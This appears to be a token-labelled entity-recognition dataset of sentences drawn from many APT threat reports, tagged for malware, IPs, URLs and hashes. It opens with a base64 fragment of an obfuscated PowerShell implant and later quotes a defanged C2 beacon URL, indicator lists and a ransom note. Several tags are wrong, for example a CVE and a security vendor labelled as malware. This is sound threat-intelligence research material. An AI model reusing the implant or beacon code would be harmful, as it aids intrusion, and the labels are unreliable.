AF0AXQAgACgAMAB4AGUANwAsACAAMAB4AGQANgAsACAAMAB4AGIAZQAsACAAMAB4AGEAOQAsACAAMAB4AGIANwAsACAAMAB4AGUANgAsACAAMAB4ADUANQAsACAAMAB4ADMAYQAsACAAMAB4AGUAZQAsACAAMAB4ADEANgAsACAAMAB4ADcAOQAsACAAMAB4AGMAYQAsACAAMAB4ADUANgAsACAAMAB4ADAAZgAsACAAMAB4AGIAYwAsACAAMAB4ADMAZgAsACAAMAB4ADIAMgAsACAAMAB4AGUAZAAsACAAMAB4AGYAZgAsACAAMAB4ADAAMgAsACAAMAB4ADQAMwAsACAAMAB4ADQAYwAsACAAMAB4ADEAYgAsACAAMAB4AGMAMAAsACAAMAB4AGUANwAsACAAMAB4ADUANwAsACAAMAB4AGIAMgAsACAAMAB4AGMAYgAsACAAMAB4AGQAOAAsACAAMAB4AGMAZQAsACAAMAB4AGQAYQAsACAAMAB4ADAAMAApAA0ACgAkAGEAZQBJACAAPQAgAFsAYgB5AHQAZQBbAF0AXQAgACgAMAB4AGIAZQAsACAAMAB4ADcAYQAsACAAMAB4ADkAMAAsACAAMAB4AGQAOQAsACAAMAB4AGQANQAsACAAMAB4AGYANwAsACAAMAB4AGEAYQAsACAAMAB4ADYAZAAsACAAMAB4AGUAOQAsACAAMAB4ADEANgAsACAAMAB4ADYANAAsACAAMAB4ADEAZAAsACAAMAB4ADkANwAsACAAMAB4ADEANgAsACAAMAB4AGMAMAAsACAAMAB4ADYANwApAA0ACgBzAFcAUAAgACcAVwBtAGkAJwAgACcAVwBtAGkAJwAgACQAYQBlAEsAIAAkAGEAZQBJACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=	O

Further	O
,	O
while	O
this	O
campaign	O
and	O
toolset	O
are	O
specific	O
to	O
the	O
Hangul	O
Word	O
Processor	O
,	O
the	O
vulnerability	O
it	O
exploited	O
(	O
CVE-2017-8291	B-malware.infosteal
)	O
is	O
not	O
.	O

APT-C-06	O
is	O
an	O
overseas	O
APT	O
organization	O
which	O
has	O
been	O
active	O
for	O
a	O
long	O
time	O
.	O

Trend	O
Micro	O
reserves	O
the	O
right	O
to	O
modify	O
the	O
contents	O
of	O
this	O
document	O
at	O
any	O
time	O
without	O
prior	O
notice.Translations	O
of	O
any	O
material	O
into	O
other	O
languages	O
are	O
intended	O
solely	O
as	O
a	O
convenience	O
.	O

At	O
this	O
point	O
,	O
it	O
is	O
pretty	O
clear	O
what	O
is	O
going	O
on	O
.	O

HOW	O
THE	O
MALWARE	O
WORKS	O

Figure	O
6	O

On	O
execution	O
,	O
the	O
malware	O
places	O
a	O
copy	O
of	O
itself	O
into	O
the	O
location	O
:	O

As	O
we	O
have	O
seen	O
for	O
several	O
years	O
now	O
,	O
dissenting	O
groups	O
,	O
especially	O
those	O
seeking	O
increased	O
levels	O
of	O
freedom	O
frequently	O
find	O
themselves	O
targeted	O
for	O
surveillance	O
and	O
information	O
extraction	O
.	O

Finally	O
,	O
location	O
D.	O
represents	O
the	O
dissolvable	O
batch	O
fi	O
le	O
which	O
deletes	O
the	O
initial	O
dropper	O
and	O
then	O
itself	O
.	O

Thank	O
you	O
all	O
.	O

The	O
obfuscated	O
PowerShell	O
implant	O
script	O
.	O

Because	O
the	O
Android	O
malware	O
could	O
facilitate	O
gross	O
position	O
information	O
,	O
its	O
successful	O
deployment	O
could	O
have	O
facilitated	O
anticipatory	O
awareness	O
of	O
Ukrainian	O
artillery	O
force	O
troop	O
movement	O
,	O
thus	O
providing	O
Russian	O
forces	O
with	O
useful	O
strategic	O
planning	O
information	O
.	O

When	O
starting	O
the	O
communication	O
,	O
the	O
agent	O
sends	O
a	O
hello	O
message	O
to	O
the	O
server	O
using	O
the	O
POST	O
request	O
detailed	O
above	O
.	O

In	O
the	O
case	O
above	O
,	O
the	O
third	O
parameter	O
is	O
'	O
1	O
'	O
=	O
0x31	O
,	O
which	O
is	O
an	O
odd	O
number	O
.	O

option	O
is	O
a	O
surprisingly	O
effective	O
stealth	O
technique	O
.	O

Bankshot	O
was	O
first	O
reported	O
by	O
the	O
Department	O
of	O
Homeland	O
Security	O
on	O
December	O
13	O
,	O
2017	O
,	O
and	O
has	O
only	O
recently	O
resurfaced	O
in	O
newly	O
compiled	O
variants	O
.	O

elpmasym	O
Net	O
CLR	O
Email	O
based	O
indications	O
of	O
possible	O
compromise	O
by	O
the	O
comment	O
crew	O
attackers	O
.	O

Appendix	O
B	O
:	O
Campaign	O
codes	O
embedded	O
in	O
NewCT/CT	B-malware.backdoor
................................................................................................................................................	O
22	O

During	O
the	O
course	O
of	O
investigating	O
activity	O
related	O
to	O
the	O
ATD	O
and	O
DPHK	O
websites	O
,	O
Volexity	B-malware.backdoor
also	O
observed	O
that	O
the	O
website	O
of	O
the	O
political	O
coalition	O
and	O
pan-democratic	O
organization	O
People	O
Power	O
in	O
Hong	O
Kong	O
(	O
www.peoplepower.hk	B-url.normal
)	O
had	O
been	O
compromised	O
as	O
well	O
.	O

Fancybear.net	O
.	O
'	O

Each	O
connection	O
attempt	O
starts	O
from	O
a	O
state	O
called	O
'	O
kliyent2podklyuchit	O
'	O
(	O
'	O
client	O
is	O
ready	O
to	O
connect	O
'	O
)	O
.	O

The	O
binary	O
of	O
the	O
testing	O
version	O
was	O
signed	O
with	O
a	O
Blik	O
certificate	O
:	O
moreover	O
,	O
Spy.Agent.ORM	O
shares	O
some	O
similarities	O
in	O
the	O
code	O
with	O
'	O
the	O
regular	O
'	O
Carbanak	B-malware.infosteal
malware	O
.	O

(	O
2013	O
)	O
.	O

Instruct	O
administrators	O
to	O
use	O
non-privileged	O
accounts	O
for	O
standard	O
functions	O
such	O
as	O
Web	O
browsing	O
or	O
checking	O
Web	O
mail	O
.	O

When	O
this	O
shortcut	O
file	O
is	O
opened	O
,	O
the	O
host	O
will	O
be	O
infected	O
with	O
malware	O
called	O
'	O
Asruex	B-malware.drop
'	O
.	O

All	O
three	O
files	O
were	O
32	O
bit	O
executable	O
files	O
.	O

arp	O
–a	O
–	O
view	O
the	O
mapping	O
of	O
IP	O
addresses	O
to	O
MAC	O
addresses	O

This	O
simply	O
deletes	O
the	O
ZxShell	B-malware.backdoor
service	O
key	O
from	O
the	O
Windows	O
registry	O
(	O
using	O
SHDeleteKey	O
Api	O
)	O
and	O
all	O
of	O
the	O
subkeys	O
.	O

Figure	O
23	O
:	O
Fake	O
Form	O
Displaying	O
Windows	O
Update	O

This	O
IP	O
was	O
observed	O
hosting	O
a	O
HTRAN	O
proxy	O
client	O
,	O
which	O
was	O
seen	O
connecting	O
to	O
a	O
backend	O
HTRAN	O
server	O
hosted	O
at	O
113.66.248.60	B-ip.unknown
.	O

Version	O
1.0	O
August	O
6	O
,	O
2014	O
File	O
name	O
:	O
varies	O
MD5	O
:	O
a3cbf6179d437909eb532b7319b3dafe	B-hash
Compilation	O
timestamp	O
:	O
2012.10.02	O
10:51:50	O
(	O
GMT	O
)	O
Compiler	O
:	O
Microsoft	O
Visual	O
Studio	O
2010	O
File	O
format	O
:	O
PE32	O
DLL	O
Exports	O
:	O
_LowLevelKeyboardProc	O
@	O
12	O
Creates	O
the	O
log	O
file	O
:	O
%	O
TEMP%\~DFD3O8.tmp	O
.	O

The	O
fake	B-malware.infosteal
Kik	I-malware.infosteal
application	O
contains	O
the	O
same	O
injected	O
malicious	O
class	O
eighty9.guru	O
and	O
a	O
specific	O
rsdroid.crt	O
file	O
with	O
different	O
certificates	O
belonging	O
to	O
the	O
C	O
&	O
C	O
domain	O
.	O

The	O
recent	O
activity	O
in	O
the	O
U.S.	O
is	O
but	O
one	O
of	O
many	O
instances	O
of	O
Russian	O
Government	O
influence	O
operations	O
conducted	O
in	O
support	O
of	O
strategic	O
political	O
objectives	O
,	O
and	O
it	O
will	O
not	O
be	O
the	O
last	O
.	O

Execute	O
a	O
process	O
Execute	O
a	O
process	O
under	O
a	O
specific	O
user	O
account	O
Credentials	O
for	O
the	O
account	O
are	O
supplied	O
by	O
the	O
attacker	O
Download	O
a	O
file	O
from	O
C	O
&	O
C	O
server	O
Copy	O
a	O
file	O

The	O
complaint	O
called	O
previous	O
Gamma	O
statements	O
into	O
question	O
,	O
noting	O
that	O
at	O
least	O
two	O
different	O
versions	O
(	O
4.00	O
and	O
4.01	O
)	O
of	O
FinSpy	B-malware.backdoor
were	O
found	O
in	O
Bahrain	O
,	O
and	O
that	O
Bahrain	O
's	O
server	O
was	O
a	O
FinFisher	B-malware.backdoor
product	O
and	O
was	O
likely	O
receiving	O
updates	O
from	O
Gamma	O
.	O

The	O
boot	O
sector	O
should	O
be	O
placed	O
at	O
sector	O
63/56	O
for	O
XP/2003	O
,	O
and	O
at	O
sector	O
2048/206848	O
for	O
Windows	O
7	O
.	O

One	O
such	O
piece	O
of	O
information	O
is	O
the	O
existence	O
of	O
specific	O
running	O
processes	O
.	O

Send	O
email	O
to	O
victims	O
warning	O
of	O
security	O
risk	O
and	O
asking	O
them	O
to	O
enable	O
security	O
service	O
.	O

Was	O
the	O
DNC	O
breach	O
part	O
of	O
a	O
concerted	O
effort	O
by	O
the	O
Russian	O
Government	O
to	O
interfere	O
with	O
the	O
U.S.	O
presidential	O
election	O
?	O

Figure	O
5	O
shows	O
a	O
document	O
purporting	O
to	O
be	O
from	O
the	O
National	O
Assembly	O
of	O
Pakistan	O
.	O

The	O
packet	O
is	O
built	O
in	O
this	O
fashion	O
:	O

Related	O
hashes	O
(	O
SHA-256	O
)	O
:	O

We	O
also	O
provide	O
an	O
update	O
on	O
shifts	O
in	O
the	O
group	O
's	O
tool	O
development	O
and	O
use	O
,	O
and	O
summarize	O
the	O
tactics	O
APT28	B-malware.infosteal
employs	O
to	O
compromise	O
its	O
victims	O
.	O

This	O
means	O
that	O
,	O
as	O
seen	O
above	O
,	O
the	O
ZxShell	B-malware.backdoor
Dll	O
is	O
started	O
in	O
listening	O
mode	O
.	O

Normally	O
this	O
program	O
is	O
the	O
operating	O
system	O
.	O

/blog/threat-research/2017/05/cyber-espionage-apt32.html	B-url.normal
Cyber	O
espionage	O
actors	O
,	O
now	O
designated	O
by	O
FireEye	O
as	O
APT32	B-malware.infosteal
(	O
OceanLotus	O
Group	O
)	O
,	O
are	O
carrying	O
out	O
intrusions	O
into	O
private	O
sector	O
companies	O
across	O
multiple	O
industries	O
and	O
have	O
also	O
targeted	O
foreign	O
governments	O
,	O
dissidents	O
,	O
and	O
journalists	O
.	O

It	O
could	O
be	O
assumed	O
that	O
the	O
malware	O
operators	O
wanted	O
to	O
have	O
centralized	O
C	O
&	O
C	O
servers	O
per	O
tool	O
or	O
tools	O
,	O
where	O
they	O
could	O
monitor	O
all	O
of	O
their	O
campaigns	O
from	O
dedicated	O
servers	O
.	O

Block	O
connections	O
to	O
the	O
included	O
fully	O
qualified	O
domain	O
names	O
.	O

The	O
'	O
Invitation.jar	B-malware.infosteal
'	O
malware	O
was	O
sent	O
in	O
a	O
phishing	O
email	O
that	O
contained	O
some	O
of	O
the	O
following	O
details	O
:	O

During	O
the	O
investigation	O
of	O
Operation	O
Cobalt	O
Kitty	O
,	O
Cybereason	O
uncovered	O
and	O
analyzed	O
new	O
tools	O
in	O
the	O
OceanLotus	O
Group	O
's	O
attack	O
arsenal	O
,	O
such	O
as	O
:	O
New	O
backdoor	O
(	O
'	O
Goopy	B-malware.backdoor
'	O
)	O
using	O
HTTP	O
and	O
DNS	O
Tunneling	O
for	O
C2	O
communication	O
.	O

We	O
do	O
not	O
know	O
which	O
malicious	O
program	O
installed	O
it	O
or	O
which	O
main	O
module	O
it	O
was	O
supposed	O
to	O
work	O
with	O
.	O

Finally	O
the	O
main	O
network	O
communication	O
function	O
GetIpListAndConnect	O
is	O
called	O
.	O

Read	O
our	O
security	O
predictions	O
for	O
2018	O
.	O

We	O
encountered	O
a	O
variety	O
of	O
targeted	O
campaigns	O
in	O
the	O
second	O
quarter	O
of	O
the	O
year	O
.	O

This	O
behavior	O
is	O
analogous	O
to	O
the	O
observed	O
correlation	O
between	O
the	O
two	O
geographically	O
separated	O
attack	O
groups	O
detailed	O
in	O
this	O
paper	O
.	O

Since	O
we	O
believe	O
this	O
attack	O
is	O
targeting	O
devices	O
in	O
India	O
this	O
is	O
also	O
something	O
which	O
a	O
non-native	O
English	O
speaker	O
may	O
see	O
as	O
'	O
normal	O
.	O
'	O

Learn	O
how	O
to	O
protect	O
Enterprises	O
,	O
Small	O
Businesses	O
,	O
and	O
Home	O
Users	O
from	O
ransomware	O
:	O
Tags	O
:	O
Lazarus	O
RATANKBA	B-malware.backdoor
Home	O
and	O
Home	O
Office	O
For	O
Business	O
Security	O
Intelligence	O
About	O
Trend	O
Micro	O
Asia	O
Pacific	O
Region	O
(	O
APAC	O
)	O
:	O
Australia	O
/	O
New	O
Zealand	O
,	O
中国	O
,	O
日本	O
,	O
대한민국	O
,	O
台灣	O

It	O
is	O
unclear	O
why	O
this	O
particular	O
command	O
is	O
included	O
three	O
times	O
in.object	O
provides	O
the	O
platform	O
for	O
a	O
tunneling	O
network	O
traffic	O
to	O
and	O
from	O
the	O
client	O
to	O
a	O
specific	O
endpoint	O
(	O
or	O
endpoints	O
if	O
multiple	O
tunnels	O
are	O
activated	O
by	O
the	O
client	O
)	O
.	O

No	O
evidence	O
of	O
the	O
application	O
has	O
been	O
observed	O
on	O
the	O
Android	O
app	O
store	O
,	O
making	O
it	O
unlikely	O
that	O
the	O
app	O
was	O
distributed	O
via	O
that	O
platform	O
.	O

T	O
he	O
script	O
was	O
designed	O
to	O
check	O
FT	O
P	O
hosts	O
from	O
an	O
incoming	O
list	O
.	O

Note	O
:	O
On	O
Windows	O
XP	O
,	O
may	O
drop	O
a	O
replacement	O
DLL	O
for	O
the	O
AppMgmt	O
service	O
using	O
ClimateVMain	O
export	O
SVC_sha256	O
:	O
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df	B-hash
.	O

February	O
2013	O
February	O
2015	O
January	O
2013	O
February	O
2015	O
July	O
2014	O
November	O
2014	O
January	O
2010	O
July	O
2014	O
June	O
2013	O
July	O
2014	O
The	O
ten	O
malware	O
campaigns	O
in	O
the	O
table	O
above	O
garnered	O
signi cant	O
media	O
attention	O
when	O
discovered	O
,	O
with	O
some	O
of	O
them	O
clearly	O
falling	O
in	O
the	O
area	O
of	O
APT	B-malware.unknown
.	O

<	O
%	O
s	O
>	O
=	O
'	O
OSVERSION	O
'	O
<	O
%	O
s	O
>	O
=	O
'	O
HOSTNAME	O
'	O
<	O
%	O
s	O
>	O
=	O
'	O
USERNAME	O
'	O
Camera	O
device	O
detected	O
<	O
%	O
s	O
>	O
=	O
'	O
No	O
'	O
Date	O
time	O
<	O
%	O
s	O
>	O
=	O
'	O
0Ìì0Ð¡Ê±0	O
•	O
Ö0Ãë	O
'	O
Presence	O
of	O
removable	O
drive	O
<	O
%	O
s	O
>	O
=	O
'	O
No	O
'	O
Backdoor	O
identifier	O
2	O
<	O
%	O
s	O
>	O
=	O
'	O
V2010-v24	O
'	O
Process	O
ID	O
of	O
the	O
process	O
where	O
the	O
backdoor	O
is	O
injected	O
<	O
%	O
d	O
>	O
=	O
21C	O
(	O
540	O
.	O
)	O

In	O
this	O
case	O
oletools	O
was	O
used	O
to	O
extract	O
the	O
macro	O
content	O
but	O
it	O
turns	O
out	O
that	O
the	O
oletools	O
was	O
able	O
to	O
extract	O
only	O
partial	O
macro	O
content	O
but	O
it	O
failed	O
to	O
extract	O
the	O
malicious	O
content	O
present	O
inside	O
a	O
Textbox	O
within	O
the	O
Userform	O
.	O

By	O
installing	O
a	O
certificate	O
outside	O
of	O
the	O
Apple	O
iOS	O
trusted	O
certificate	O
chain	O
,	O
you	O
may	O
open	O
up	O
to	O
possible	O
third-party	O
attacks	O
like	O
this	O
.	O

The	O
EvilGrab	B-malware.drop
campaign	O
's	O
use	O
of	O
exploits	B-malware.backdoor
,	O
payloads	B-malware.backdoor
,	O
and	O
decoy	O
documents	B-malware.backdoor
is	O
similar	O
to	O
the	O
Taidoor	B-malware.drop
campaign	O
in	O
2012	O
.	O

Sandbox	O
Evasion	O

In-memory	O
fileless	B-malware.unknown
payloads	O
from	O
C	O
&	O
C	O
servers	O

The	O
document	O
is	O
designed	O
to	O
trick	O
users	O
into	O
enabling	O
the	O
macro	O
to	O
view	O
its	O
full	O
content	O
.	O

Two	O
user	O
accounts	O
are	O
hardcoded	O
into	O
the	O
malware	O
,	O
and	O
are	O
used	O
to	O
establish	O
connections	O
to	O
the	O
C	O
$	O
SMB	O
shares	O
on	O
Windows	O
devices	O
.	O

Have	O
we	O
tested	O
this	O
?	O

Antiy	O
Labs	O
is	O
awarded	O
the	O
'	O
Best	O
Protection	O
'	O
prize	O
by	O
AV-TEST	O
in	O
2013	O
.	O

The	O
use	O
of	O
Tranchulas	O
and	O
UmairAziz27	O
in	O
the	O
malware	O
debugging	O
paths	O
,	O
in	O
addition	O
to	O
the	O
multiple	O
targeting	O
campaigns	O
that	O
maintain	O
themes	O
likely	O
aimed	O
at	O
Indian	O
entities	O
or	O
involving	O
Pakistan	O
related	O
issues	O
,	O
leads	O
us	O
to	O
assess	O
the	O
following	O
competing	O
hypotheses	O
which	O
may	O
be	O
considered	O
as	O
plausible	O
explanations	O
for	O
the	O
identified	O
activity	O
:	O
Hypothesis	O
1	O
:	O
Tranchulas	O
developed	O
the	O
malicious	O
binaries	O
,	O
and	O
staged	O
them	O
for	O
offensive	O
exploitation	O
operations	O
on	O
behalf	O
of	O
an	O
unidentified	O
customer	O
.	O

Patches	O
against	O
CVE-2016-0034	O
should	O
be	O
applied	O
as	O
soon	O
as	O
possible	O
.	O

uploadData	O
:	O
withFileName	O
:	O
toServer	O
:	O
]	O

The	O
malware	O
can	O
access	O
location	O
,	O
network	O
state	O
,	O
battery	O
status	O
,	O
Bluetooth	O
,	O
camera	O
,	O
capturing	O
audio	O
,	O
internet	O
,	O
...	O
,	O
etc	O
.	O

Then	O
the	O
attacker	O
looks	O
for	O
all	O
administrator	O
accounts	O
on	O
both	O
the	O
local	O
machine	O
and	O
the	O
network	O
.	O

内核技术	O
(	O
9	O
)	O

또한	O
안다리엘	O
그룹에서	O
제작한	O
악성코드는	O
유사한	O
암호화	O
방식을	O
사용하고	O
있다	O
.	O

More	O
information	O
is	O
available	O
at	O
www.symantec.com	O
or	O
by	O
connecting	O
with	O
Symantec	O
at	O
go.symantec.com/socialmedia	O

Do	O
not	O
provide	O
personal	O
information	O
or	O
information	O
about	O
your	O
organization	O
,	O
including	O
its	O
structure	O
or	O
networks	O
,	O
unless	O
you	O
are	O
certain	O
of	O
a	O
person	O
's	O
authority	O
to	O
have	O
the	O
information	O
.	O

take	O
example	O
analysis	O
,	O
we	O
All	O
Bandook	B-malware.unknown
executables	O
are	O
similar	O
in	O
size	O
.	O

For	O
example	O
:	O
These	O
words	O
indicate	O
what	O
information	O
the	O
attackers	O
are	O
after	O
-	O
information	O
pertaining	O
to	O
homeland	O
security	O
and	O
military	O
issues	O
;	O
personal	O
documents	O
;	O
credentials	O
,	O
certificates	O
and	O
private	O
keys	O
.	O

The	O
Gh0st	B-malware.backdoor
packet	O
header	O
for	O
version	O
3.6	O
uses	O
the	O
13-byte	O
format	O
shown	O
in	O
Figure	O
3	O
:	O

!	O
=	O
'	O
*	O
'	O
buffer	O
=	O
10000	O
;	O

DecryptCommandBuffer_sub_44C628	O
(	O
)	O
function	O
to	O
continue	O
reversing	O
the	O
crypto	O
algorithm	O
.	O

2015	O
.	O

HERMES	B-malware.ransom
2.1	I-malware.ransom
RANSOMWARE	I-malware.ransom
radical	I-malware.ransom
edition	I-malware.ransom
All	O
your	O
important	O
files	O
are	O
encrypted	O
Your	O
files	O
has	O
been	O
encrypted	O
using	O
RSA2048	O
algorithm	O
with	O
unique	O
public-key	O
stored	O
on	O
your	O
PC	O
.	O

Next	O
,	O
the	O
dropper	O
will	O
find	O
and	O
decrypt	O
encrypted	O
data	O
stored	O
as	O
two	O
PE	O
resources	O
embedded	O
in	O
the	O
executable	O
.	O

Retro	O
's	O
attack	O
method	O
has	O
been	O
used	O
since	O
2016	O
.	O

From	O
there	O
,	O
it	O
schedules	O
tasks	O
to	O
be	O
executed	O
asynchronously	O
in	O
the	O
background	O
by	O
leveraging	O
the	O
apps	O
'	O
background	O
task	O
queue	O
.	O

Every	O
sub-routine	O
from	O
the	O
malicious	O
code	O
has	O
a	O
'	O
memory	O
cleaner	O
routine	O
'	O
when	O
the	O
logic	O
ends	O
.	O

Whenever	O
an	O
instance	O
of	O
is	O
launched	O
(	O
i.e.	O
,	O
at	O
every	O
system	O
startup	O
)	O
,	O
the	O
system	O
searches	O
for	O
the	O
said	O
.DLL	B-malware.backdoor
file	O
and	O
loads	O
it	O
.	O

Users	O
must	O
be	O
aware	O
that	O
accepting	O
an	O
MDM	B-malware.infosteal
certificate	O
is	O
equivalent	O
to	O
allowing	O
someone	O
administrator	O
access	O
to	O
their	O
device	O
,	O
passwords	O
,	O
etc	O
.	O

The	O
above	O
beacon	O
request	O
can	O
be	O
decoded	O
by	O
base64	O
decoding	O
with	O
this	O
alphabet	O
,	O
'	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_	O
'	O
.	O

These	O
executables	O
are	O
usually	O
droppers	O
similar	O
to	O
those	O
used	O
to	O
infect	O
a	O
host	O
with	O
CozyDuke	B-malware.drop
.	O

The	O
owner	O
is	O
Peng	O
Yong	O
,	O
a	O
Mandarin	O
speaker	O
who	O
may	O
have	O
some	O
programming	O
background	O
with	O
such	O
algorithms	O
.	O

Decoy	O
Document	O
Last	O
Modified	O
:	O

Softphone	O
executable	O
names	O
A	O
version	O
number	O
Path	O
and	O
filename	O
of	O
the	O
dump	O
file	O
Path	O
to	O
the	O
runtime	O
data	O
directory	O
Two	O
C	O
&	O
C	O
server	O
domains	O
and	O
request	O
parameters	O
Web	O
browser	O
executable	O
names	O
,	O
including	O
MSN	O
messenger	O
The	O
name	O
of	O
the	O
dropped	O
implant	O
As	O
could	O
be	O
seen	O
already	O
in	O
binaries	O
of	O
related	O
families	O
,	O
next	O
to	O
the	O
hardcoded	O
configuration	O
data	O
Babar	B-malware.drop
maintains	O
a	O
system	O
specific	O
runtime	O
configuration	O
.	O

Often	O
used	O
to	O
collect	O
O ce	O
 les	O
from	O
temporary	O
internet	O
history	O
.	O

Here	O
is	O
a	O
recent	O
version	O
:	O
'	O
hxxp://sendspace.servermsys.com/readme.php?type=execution&result=created_and_executed	O
&	O
info=	O
'	O
+	O
navigator.appMinorVersion	O
+	O
'	O
The	O
'	O
internet_explorer_Smart_recovery.exe	O
'	O
file	O
is	O
a	O
simple	O
obfuscated	O
downloader	O
.	O

So	O
it	O
should	O
not	O
surprise	O
anyone	O
that	O
just	O
as	O
nuclear	O
capable	O
Russian	O
bombers	O
are	O
increasingly	O
penetrating	O
foreign	O
airspace	O
,	O
their	O
cyber-warriors	O
appear	O
to	O
be	O
ramping	O
up	O
their	O
intrusions	O
as	O
well	O
.	O

The	O
GetLocalPcDescrStr	O
and	O
DoHandshake	O
functions	O
called	O
beforestarting	O
the	O
command	O
processing	O
Otherwise	O
,	O
the	O
ZxShell	B-malware.backdoor
code	O
closes	O
the	O
socket	O
used	O
and	O
sleeps	O
for	O
30	O
seconds	O
.	O

Email	O
attachment	O
names	O

Crowdstrike	O
has	O
observed	O
Deep	O
Panda	O
adopting	O
web	O
shells	B-malware.backdoor
as	O
their	O
primary	O
access	O
back	O
into	O
a	O
victim	O
organization	O
.	O

Table	O
A-5	O
:	O
Listing	O
up	O
the	O
process	O
modules	O
that	O
are	O
running	O
,	O
and	O
the	O
module	O
version	O
matches	O
the	O
combination	O
listed	O
.	O

Documents	O
with	O
the	O
Flash	O
exploit	O
managed	O
to	O
evade	O
static	O
defenses	O
and	O
remain	O
undetected	O
as	O
an	O
exploit	O
on	O
VirusTotal	O
.	O

Location	O
Resolve	O
104.153.45.38	B-ip.unknown
199.231.93.221	B-ip.unknown
US	O
199.119.202.195	B-ip.unknown
US	O
208.87.242.66	B-ip.unknown
209.62.21.228	B-ip.unknown
83.149.75.58	B-ip.unknown
69.25.212.153	B-ip.unknown
64.20.43.107	B-ip.unknown
207.189.104.87	B-ip.unknown
US	O
207.189.104.86	O
US	O
207.189.104.87	O
US	O
207.189.104.86	B-ip.unknown
US	O
207.189.104.87	O
US	O
207.189.104.86	O
US	O
207.189.104.87	B-ip.unknown
US	O
207.189.104.86	O
US	O
207.189.104.87	O
US	O
207.189.104.86	B-ip.unknown
US	O
207.189.104.87	O
US	O
207.189.104.86	O
US	O
207.189.104.87	B-ip.unknown
US	O
216.152.252.55	B-ip.unknown
US	O
Network	O
104.153.45.0/24	B-ip.unknown
199.231.93.0/24	B-ip.unknown
199.119.200.0/21	B-ip.unknown
208.87.240.0/22	B-ip.unknown
209.62.0.0/17	B-ip.unknown
83.149.64.0/18	B-ip.unknown
69.25.208.0/20	B-ip.unknown
64.20.32.0/19	B-ip.unknown
216.152.240.0/20	B-ip.unknown
First	O
31.12.2013	O
00:00	O
03.07.2011	O
00:00	O
10.04.2011	O
00:00	O
16.03.2008	O
00:00	O
26.08.2007	O
00:00	O
24.06.2007	O
00:00	O
24.03.2007	O
00:00	O
18.11.2006	O
00:00	O
12.08.2006	O
00:00	O
05.08.2006	O
00:00	O
08.07.2006	O
00:00	O
01.07.2006	O
00:00	O
17.06.2006	O
00:00	O
10.06.2006	O
00:00	O
06.05.2006	O
00:00	O
29.04.2006	O
00:00	O
18.03.2006	O
00:00	O
05.03.2006	O
00:00	O
25.02.2006	O
00:00	O
12.02.2006	O
00:00	O
27.11.2005	O
00:00	O
21.11.2004	O
00:00	O
Last	O
09.11.2014	O
00:00	O
31.12.2013	O
00:00	O
03.07.2011	O
00:00	O
10.04.2011	O
00:00	O
16.03.2008	O
00:00	O
26.08.2007	O
00:00	O
24.06.2007	O
00:00	O
24.03.2007	O
00:00	O
18.11.2006	O
00:00	O
12.08.2006	O
00:00	O
05.08.2006	O
00:00	O
08.07.2006	O
00:00	O
01.07.2006	O
00:00	O
17.06.2006	O
00:00	O
10.06.2006	O
00:00	O
06.05.2006	O
00:00	O
29.04.2006	O
00:00	O
18.03.2006	O
00:00	O
05.03.2006	O
00:00	O
25.02.2006	O
00:00	O
12.02.2006	O
00:00	O
27.11.2005	O
00:00	O

Once	O
access	O
is	O
established	O
,	O
the	O
attacker	O
may	O
decommission	O
their	O
server	O
and	O
subsequent	O
analysis	O
of	O
the	O
attack	O
must	O
rely	O
on	O
leftover	O
forensic	O
artifacts	O
.	O

The	O
fourth	O
version	O
of	O
ANEL	B-malware.backdoor
(	O
5.2.0	O
rev1	O
)	O
changes	O
both	O
the	O
export	O
function	O
in	O
the	O
expanded	O
main	O
ANEL	B-malware.backdoor
DLL	O
and	O
uses	O
a	O
different	O
C	O
&	O
C	O
server	O
.	O

•	O
Leveraging	O
zero-day	O
vulnerabilities	O
in	O
Adobe	O
Flash	O
Player	O
,	O
Java	O
,	O
and	O
Windows	O
,	O
including	O
CVE-2015-1701	O
,	O
CVE-2015-2424	O
,	O
CVE-2015-2590	O
,	O
CVE-2015-3043	O
,	O
CVE-2015-5119	O
,	O
and	O
CVE-2015-7645	O
.	O

On	O
several	O
3.00	O
samples	O
,	O
the	O
author	O
forgot	O
to	O
remove	O
the	O
compilation	O
path	O
,	O
here	O
are	O
some	O
examples	O
:	O
c	O
:	O
\projects\ChinckSkx64\Debug\Chinch.pdb	O
c	O
:	O
\projects\ChinckSkx64\Release\libadcodec.pdb	O
C	O
:	O
\projects\ChinckSkx64\x64\Release\libadcodec.pdb	O
E	O
:	O
\old_comp\_Chinch\Chinch\trunk\Debug\Chinch.pdb	O
c	O
:	O
\projects\ChinchSk\Release\libadcodec.pdb	O
Thanks	O
to	O
these	O
compilation	O
paths	O
,	O
we	O
assume	O
that	O
the	O
original	O
name	O
of	O
the	O
RAT	B-malware.backdoor
is	O
'	O
Chinch	B-malware.backdoor
'	O
,	O
which	O
leads	O
us	O
to	O
the	O
assumption	O
that	O
the	O
'	O
CH	O
'	O
characters	O
in	O
the	O
version	O
name	O
and	O
in	O
the	O
flag	O
'	O
<	O
CHCMD	O
>	O
'	O
stands	O
for	O
'	O
Chinch	O
'	O
.	O

According	O
to	O
the	O
traces	O
in	O
the	O
past	O
,	O
we	O
believe	O
that	O
the	O
threat	O
has	O
been	O
active	O
for	O
5	O
years	O
;	O
unfortunately	O
,	O
there	O
is	O
n't	O
any	O
powerful	O
detection	O
production	O
and	O
methods	O
to	O
defeat	O
the	O
malicious	O
attack	O
till	O
now	O
.	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

Other	O
variants	O
overwrite	O
the	O
exploit	O
document	O
with	O
the	O
contents	O
of	O
the	O
decoy	O
document	B-malware.backdoor
.	O

First	O
discovered	O
circa	O
2007	O
using	O
security	O
vulnerabilities	O
in	O
Microsoft	O
Windows	O
,	O
Sofacy	O
has	O
gone	O
on	O
to	O
develop	O
and	O
launch	O
truly	O
enormous	O
attacks	O
exploiting	O
numerous	O
applications	O
including	O
Adobe	O
's	O
Acrobat	O
,	O
Microsoft	O
Excel	O
,	O
and	O
others	O
.	O

As	O
you	O
recall	O
,	O
there	O
is	O
a	O
function	O
that	O
should	O
have	O
collected	O
this	O
data	O
and	O
should	O
have	O
saved	O
it	O
into	O
this	O
sqlxmlx.inc	O
file	O
.	O

When	O
a	O
user	O
of	O
the	O
C2	O
client	O
needs	O
to	O
perform	O
an	O
action	O
on	O
a	O
server	O
from	O
a	O
compromised	O
host	O
,	O
a	O
Command	O
packet	O
containing	O
the	O
highlighted	O
capabilities	O
is	O
created	O
